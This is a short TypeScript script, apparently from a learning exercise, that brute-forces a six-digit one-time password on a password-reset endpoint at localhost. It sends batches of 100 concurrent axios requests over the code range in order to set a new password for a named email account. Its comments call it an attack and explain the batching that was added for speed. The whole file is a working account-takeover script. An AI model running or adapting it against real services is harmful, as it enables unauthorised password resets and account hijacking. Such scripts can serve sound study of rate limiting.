import axios from 'axios';


async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "vikash1a@gmail.com",
        "otp": otp,
        "newPassword": "123d123"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };

    try{

    await axios.request(config)
    }catch(e){
        // console.log(e);
        
    }
    // .then((response) => {
    //     console.log(JSON.stringify(response.data));
    // })
    // .catch((error) => {
    //     console.log(error);
    // });
}

// sendRequest("359043");//single request working welll to reset password 
//now lets attack

// for(let i =0;i<=999999;i++){
//     console.log(i);
//     sendRequest(i.toString());
// }

//after some counts its so slow and unfortunately crashes -->>>> needs of batching 
// ?>>>> sending bunch of req and after them sending the other next bunch of requests

async function main() {
    for(let i=70000;i<=999999;i+=100){
        const p = [];
        console.log(i);
        for(let j=0;j<100;j++ ){
            p.push(sendRequest((i+j).toString()));
        }
        await Promise.all(p);
    }
}
main()